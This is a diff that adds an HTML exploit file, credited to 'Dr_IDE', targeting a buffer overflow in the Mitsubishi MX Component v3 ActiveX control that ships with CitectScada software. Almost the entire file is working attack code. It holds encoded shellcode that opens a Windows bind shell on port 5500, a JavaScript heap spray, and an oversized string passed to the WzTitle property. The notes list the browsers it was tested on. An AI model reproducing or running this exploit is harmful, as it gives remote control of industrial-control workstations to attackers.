@@ -1,0 +1,51 @@
+<!--
+Title: Mitsubishi MX Component v3 ActiveX 365+-Day [ActUWzd.dll (WzTitle)]
+By:	Dr_IDE
+File:	C:\MELSEC\Act\Control\ActUWzd.dll (Version 1.0.0.1)
+Known Affected Systems: CitectScada 7.10r1 ships with this in the "Extras" folder.
+Known Affected Systems: CitectFacilities 7.10 ships with this in the "Extras" folder.
+I am unsure as to what other vendors ship/support this.
+Pretty much any control in this library with type "String" is vulnerable.
+Been sitting on this one forever. I don't even think Citect ships with this particular 3rd Party Component Anymore.
+I would love to hear if any other packages ship with this component.
+--!>
+
+<html>
+<object id='target' classid='clsid:B5D4B42F-AD6E-11D3-BE97-0090FE014643'></object>
+<script >
+
+//Payload is a windows/bindshell that is spawned on LPORT=5500
+shellcode = unescape("%ud9db%u74d9%uf424%uc929%u51b1%u02bf%u6c21%u588e%u7831%u8317%u04c0%u7a03%u8e32%u867b%ua55e%u9ec9%uc666%ua12d%ub2f9%u79be%u4fde%ubd7b%u2c95%uc581%u23a8%u7a02%u30b3%ua44a%uadc2%u2f3c%ubaf0%uc1be%u7cc8%ub159%ubdaf%uce2e%uf76e%ud1c2%ue3b2%uea29%ud066%u79f9%u9362%ua5a5%u4f6d%u2e3f%uc461%u6f4b%udb66%u8ca0%u50ba%ufebf%u7ae6%u3da1%u59d7%u4a45%u6e5b%u0c0d%u0550%u9061%u92c5%ua0c2%ucd4b%ufe4c%ue17d%u0101%u9f57%u9bf2%u5330%u0bc7%ue0b6%u9415%uf86c%u428a%ueb46%ua9d7%u0b08%u92f1%u1621%uad98%ud1df%uf867%ue075%ud298%u3de2%u276f%uea5f%u118f%u46f3%uce23%u2ba7%ub390%u5314%u55c6%ubef3%uff9b%u4850%u6a82%uee3e%ue45f%ub978%ud2a0%u56ed%u8f0e%u860e%u8bd8%u095c%u84f0%u8061%u7f51%ufd61%u9a3e%u78d4%u33f7%u5218%uef58%u0eb2%udfa6%ud9a8%ua6bf%u6008%ua717%uc643%u8768%u830a%u41f2%u30bb%u0496%uddde%u4f38%uee08%u8830%uaa20%ub4cb%uf284%u923f%ub019%u1c92%u19a7%u6d7e%u5a52%uc62b%uf208%ue659%u15fc%u6361%ue547%ud04b%u4b10%ub725%u01cf%u66c4%u80a1%u7797%u4391%u5eb5%u5a17%u9f96%u08ce%ua0e6%u33d8%ud5c8%u3070%u2d6a%u371a%uffbb%u171c%u0f2c%u9c68%ubcf2%u4b92%u92f3"); 
+
+var bigblock  = unescape("%u0A0A%u0A00"); //we smash a CALL ECX+C call so we send 00 to get 0A
+var headersize = 20;
+var slackspace = headersize+shellcode.length;
+while (bigblock.length<slackspace)
+bigblock+=bigblock;
+      
+fillblock = bigblock.substring(0, slackspace);
+block = bigblock.substring(0, bigblock.length-slackspace);
+while(block.length+slackspace<0x40000)
+block = block+block+fillblock;
+
+memory = new Array();
+for (x=0; x<300; x++)
+memory[x] = block + shellcode;
+		
+var buffer = '';	
+
+while (buffer.length < 4000)
+
+buffer+="\x0A\x0A\x0A\x0A";
+
+target.WzTitle = buffer;
+</script>
+Mitsubishi MX Component v3 ActiveX 0-Day [ActUWzd.dll (WzTitle)] Heap Spray<br>
+Download: 	This is included with CitectFacilities 7.10r1 from www.citectscada.com<br>
+Information: 	http://www.mitsubishi-automation.com/products/software_mx_components_content.htm<br>
+Found/Coded By: Dr_IDE<br>
+Tested: 	XPSP3 + IE6<br>
+Tested: 	XPSP3 + IE7<br>
+Notes: 		Check your bindshell on port 5500
+</body>
+</html>
